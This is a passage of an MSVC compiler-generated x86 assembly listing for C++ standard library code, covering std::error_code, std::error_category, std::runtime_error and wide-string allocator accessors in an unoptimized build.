  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?category@error_code@std@@QBEABVerror_category@2@XZ ; std::error_code::category
  00011	89 45 f8	 mov	 DWORD PTR tv67[ebp], eax
  00014	8b 45 f8	 mov	 eax, DWORD PTR tv67[ebp]
  00017	8b 08		 mov	 ecx, DWORD PTR [eax]
  00019	8b 51 08	 mov	 edx, DWORD PTR [ecx+8]
  0001c	89 55 f0	 mov	 DWORD PTR tv78[ebp], edx
  0001f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00022	e8 00 00 00 00	 call	 ?value@error_code@std@@QBEHXZ ; std::error_code::value
  00027	89 45 f4	 mov	 DWORD PTR tv76[ebp], eax
  0002a	8b 45 f4	 mov	 eax, DWORD PTR tv76[ebp]
  0002d	50		 push	 eax
  0002e	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00031	51		 push	 ecx
  00032	8b 4d f8	 mov	 ecx, DWORD PTR tv67[ebp]
  00035	ff 55 f0	 call	 DWORD PTR tv78[ebp]
  00038	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 210  :     }

  0003b	8b e5		 mov	 esp, ebp
  0003d	5d		 pop	 ebp
  0003e	c2 04 00	 ret	 4
?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ENDP ; std::error_code::message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?category@error_code@std@@QBEABVerror_category@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?category@error_code@std@@QBEABVerror_category@2@XZ PROC ; std::error_code::category, COMDAT
; _this$ = ecx

; 202  :     _NODISCARD const error_category& category() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 203  :         return *_Mycat;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 04	 mov	 eax, DWORD PTR [eax+4]

; 204  :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?category@error_code@std@@QBEABVerror_category@2@XZ ENDP ; std::error_code::category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?value@error_code@std@@QBEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?value@error_code@std@@QBEHXZ PROC			; std::error_code::value, COMDAT
; _this$ = ecx

; 198  :     _NODISCARD int value() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 199  :         return _Myval;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 00		 mov	 eax, DWORD PTR [eax]

; 200  :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?value@error_code@std@@QBEHXZ ENDP			; std::error_code::value
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0error_code@std@@QAE@HABVerror_category@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Val$ = 8						; size = 4
__Cat$ = 12						; size = 4
??0error_code@std@@QAE@HABVerror_category@1@@Z PROC	; std::error_code::error_code, COMDAT
; _this$ = ecx

; 173  :     error_code(int _Val, const error_category& _Cat) noexcept : _Myval(_Val), _Mycat(&_Cat) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Val$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx
  0000f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Cat$[ebp]
  00015	89 42 04	 mov	 DWORD PTR [edx+4], eax
  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 08 00	 ret	 8
??0error_code@std@@QAE@HABVerror_category@1@@Z ENDP	; std::error_code::error_code
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$_Bit_cast@IT_Addr_storage@error_category@std@@$0A@@std@@YAIABT_Addr_storage@error_category@0@@Z
_TEXT	SEGMENT
$T1 = -4						; size = 4
__Val$ = 8						; size = 4
??$_Bit_cast@IT_Addr_storage@error_category@std@@$0A@@std@@YAIABT_Addr_storage@error_category@0@@Z PROC ; std::_Bit_cast<unsigned int,std::error_category::_Addr_storage,0>, COMDAT

; 2510 : _NODISCARD constexpr _To _Bit_cast(const _From& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2511 :     return __builtin_bit_cast(_To, _Val);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]
  00007	8b 08		 mov	 ecx, DWORD PTR [eax]
  00009	89 4d fc	 mov	 DWORD PTR $T1[ebp], ecx
  0000c	8b 45 fc	 mov	 eax, DWORD PTR $T1[ebp]

; 2512 : }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$_Bit_cast@IT_Addr_storage@error_category@std@@$0A@@std@@YAIABT_Addr_storage@error_category@0@@Z ENDP ; std::_Bit_cast<unsigned int,std::error_category::_Addr_storage,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??8error_category@std@@QBE_NABV01@@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv71 = -4						; size = 4
__Right$ = 8						; size = 4
??8error_category@std@@QBE_NABV01@@Z PROC		; std::error_category::operator==, COMDAT
; _this$ = ecx

; 99   :     _NODISCARD bool operator==(const error_category& _Right) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	56		 push	 esi
  00007	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 100  : #ifdef _M_CEE_PURE
; 101  :         return _Addr == _Right._Addr;
; 102  : #else // ^^^ defined(_M_CEE_PURE) / !defined(_M_CEE_PURE) vvv
; 103  :         return _Bit_cast<uintptr_t>(_Addr) == _Bit_cast<uintptr_t>(_Right._Addr);

  0000a	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000d	83 c0 04	 add	 eax, 4
  00010	50		 push	 eax
  00011	e8 00 00 00 00	 call	 ??$_Bit_cast@IT_Addr_storage@error_category@std@@$0A@@std@@YAIABT_Addr_storage@error_category@0@@Z ; std::_Bit_cast<unsigned int,std::error_category::_Addr_storage,0>
  00016	83 c4 04	 add	 esp, 4
  00019	8b f0		 mov	 esi, eax
  0001b	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0001e	83 c1 04	 add	 ecx, 4
  00021	51		 push	 ecx
  00022	e8 00 00 00 00	 call	 ??$_Bit_cast@IT_Addr_storage@error_category@std@@$0A@@std@@YAIABT_Addr_storage@error_category@0@@Z ; std::_Bit_cast<unsigned int,std::error_category::_Addr_storage,0>
  00027	83 c4 04	 add	 esp, 4
  0002a	3b f0		 cmp	 esi, eax
  0002c	75 09		 jne	 SHORT $LN3@operator
  0002e	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv71[ebp], 1
  00035	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  00037	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv71[ebp], 0
$LN4@operator:
  0003e	0f b6 45 fc	 movzx	 eax, BYTE PTR tv71[ebp]

; 104  : #endif // ^^^ !defined(_M_CEE_PURE) ^^^
; 105  :     }

  00042	5e		 pop	 esi
  00043	8b e5		 mov	 esp, ebp
  00045	5d		 pop	 ebp
  00046	c2 04 00	 ret	 4
??8error_category@std@@QBE_NABV01@@Z ENDP		; std::error_category::operator==
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv74 = -4						; size = 4
__Code$ = 8						; size = 4
__Errval$ = 12						; size = 4
?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z PROC ; std::error_category::equivalent, COMDAT
; _this$ = ecx

; 424  : _NODISCARD inline bool error_category::equivalent(const error_code& _Code, int _Errval) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 425  :     return *this == _Code.category() && _Code.value() == _Errval;

  00009	8b 4d 08	 mov	 ecx, DWORD PTR __Code$[ebp]
  0000c	e8 00 00 00 00	 call	 ?category@error_code@std@@QBEABVerror_category@2@XZ ; std::error_code::category
  00011	50		 push	 eax
  00012	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	e8 00 00 00 00	 call	 ??8error_category@std@@QBE_NABV01@@Z ; std::error_category::operator==
  0001a	0f b6 c0	 movzx	 eax, al
  0001d	85 c0		 test	 eax, eax
  0001f	74 16		 je	 SHORT $LN3@equivalent
  00021	8b 4d 08	 mov	 ecx, DWORD PTR __Code$[ebp]
  00024	e8 00 00 00 00	 call	 ?value@error_code@std@@QBEHXZ ; std::error_code::value
  00029	3b 45 0c	 cmp	 eax, DWORD PTR __Errval$[ebp]
  0002c	75 09		 jne	 SHORT $LN3@equivalent
  0002e	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv74[ebp], 1
  00035	eb 07		 jmp	 SHORT $LN4@equivalent
$LN3@equivalent:
  00037	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv74[ebp], 0
$LN4@equivalent:
  0003e	0f b6 45 fc	 movzx	 eax, BYTE PTR tv74[ebp]

; 426  : }

  00042	8b e5		 mov	 esp, ebp
  00044	5d		 pop	 ebp
  00045	c2 08 00	 ret	 8
?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z ENDP ; std::error_category::equivalent
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z
_TEXT	SEGMENT
$T1 = -16						; size = 8
tv73 = -8						; size = 4
_this$ = -4						; size = 4
__Errval$ = 8						; size = 4
__Cond$ = 12						; size = 4
?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z PROC ; std::error_category::equivalent, COMDAT
; _this$ = ecx

; 420  : _NODISCARD inline bool error_category::equivalent(int _Errval, const error_condition& _Cond) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 421  :     return default_error_condition(_Errval) == _Cond;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000e	8b 51 0c	 mov	 edx, DWORD PTR [ecx+12]
  00011	89 55 f8	 mov	 DWORD PTR tv73[ebp], edx
  00014	8b 45 0c	 mov	 eax, DWORD PTR __Cond$[ebp]
  00017	50		 push	 eax
  00018	8b 4d 08	 mov	 ecx, DWORD PTR __Errval$[ebp]
  0001b	51		 push	 ecx
  0001c	8d 55 f0	 lea	 edx, DWORD PTR $T1[ebp]
  0001f	52		 push	 edx
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	ff 55 f8	 call	 DWORD PTR tv73[ebp]
  00026	50		 push	 eax
  00027	e8 00 00 00 00	 call	 ??8std@@YA_NABVerror_condition@0@0@Z ; std::operator==
  0002c	83 c4 08	 add	 esp, 8

; 422  : }

  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c2 08 00	 ret	 8
?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z ENDP ; std::error_category::equivalent
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Errval$ = 12						; size = 4
?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z PROC ; std::error_category::default_error_condition, COMDAT
; _this$ = ecx

; 415  : _NODISCARD inline error_condition error_category::default_error_condition(int _Errval) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 416  :     // make error_condition for error code
; 417  :     return error_condition(_Errval, *this);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 0c	 mov	 ecx, DWORD PTR __Errval$[ebp]
  0000e	51		 push	 ecx
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00012	e8 00 00 00 00	 call	 ??0error_condition@std@@QAE@HABVerror_category@1@@Z ; std::error_condition::error_condition
  00017	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 418  : }

  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c2 08 00	 ret	 8
?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z ENDP ; std::error_category::default_error_condition
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??1error_category@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1error_category@std@@UAE@XZ PROC			; std::error_category::~error_category, COMDAT
; _this$ = ecx

; 87   :     _CONSTEXPR20 virtual ~error_category() noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??1error_category@std@@UAE@XZ ENDP			; std::error_category::~error_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?system_category@std@@YAABVerror_category@1@XZ
_TEXT	SEGMENT
?system_category@std@@YAABVerror_category@1@XZ PROC	; std::system_category, COMDAT

; 708  : _EXPORT_STD _NODISCARD inline const error_category& system_category() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 709  :     return _Immortalize_memcpy_image<_System_error_category>();

  00003	e8 00 00 00 00	 call	 ??$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@0@XZ ; std::_Immortalize_memcpy_image<std::_System_error_category>

; 710  : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
?system_category@std@@YAABVerror_category@1@XZ ENDP	; std::system_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?iostream_category@std@@YAABVerror_category@1@XZ
_TEXT	SEGMENT
?iostream_category@std@@YAABVerror_category@1@XZ PROC	; std::iostream_category, COMDAT

; 704  : _EXPORT_STD _NODISCARD inline const error_category& iostream_category() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 705  :     return _Immortalize_memcpy_image<_Iostream_error_category2>();

  00003	e8 00 00 00 00	 call	 ??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@0@XZ ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>

; 706  : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
?iostream_category@std@@YAABVerror_category@1@XZ ENDP	; std::iostream_category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?generic_category@std@@YAABVerror_category@1@XZ
_TEXT	SEGMENT
?generic_category@std@@YAABVerror_category@1@XZ PROC	; std::generic_category, COMDAT

; 700  : _EXPORT_STD _NODISCARD inline const error_category& generic_category() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 701  :     return _Immortalize_memcpy_image<_Generic_error_category>();

  00003	e8 00 00 00 00	 call	 ??$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@0@XZ ; std::_Immortalize_memcpy_image<std::_Generic_error_category>

; 702  : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
?generic_category@std@@YAABVerror_category@1@XZ ENDP	; std::generic_category
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gruntime_error@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_Gruntime_error@std@@UAEPAXI@Z PROC			; std::runtime_error::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1runtime_error@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 0c		 push	 12			; 0000000cH
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_Gruntime_error@std@@UAEPAXI@Z ENDP			; std::runtime_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0runtime_error@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0runtime_error@std@@QAE@ABV01@@Z PROC			; std::runtime_error::runtime_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0exception@std@@QAE@ABV01@@Z ; std::exception::exception
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7runtime_error@std@@6B@
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	8b e5		 mov	 esp, ebp
  00021	5d		 pop	 ebp
  00022	c2 04 00	 ret	 4
??0runtime_error@std@@QAE@ABV01@@Z ENDP			; std::runtime_error::runtime_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1runtime_error@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1runtime_error@std@@UAE@XZ PROC			; std::runtime_error::~runtime_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1exception@std@@UAE@XZ ; std::exception::~exception
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1runtime_error@std@@UAE@XZ ENDP			; std::runtime_error::~runtime_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\stdexcept
;	COMDAT ??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Message$ = 8						; size = 4
??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::runtime_error::runtime_error, COMDAT
; _this$ = ecx

; 104  :     explicit runtime_error(const string& _Message) : _Mybase(_Message.c_str()) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d 08	 mov	 ecx, DWORD PTR __Message$[ebp]
  0000a	e8 00 00 00 00	 call	 ?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ??0exception@std@@QAE@QBD@Z ; std::exception::exception
  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7runtime_error@std@@6B@
  00021	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c2 04 00	 ret	 4
??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::runtime_error::runtime_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QBEABV?$allocator@_W@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QBEABV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT
; _this$ = ecx

; 1534 :     constexpr const _Ty1& _Get_first() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1535 :         return *this;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1536 :     }

  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QBEABV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAEAAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAEAAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT
; _this$ = ecx

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1531 :         return *this;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1532 :     }

  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAEAAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT
; _this$ = ecx

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4894 :         return _Mypair._Get_first();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QBEABV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4895 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEABV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT
; _this$ = ecx

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

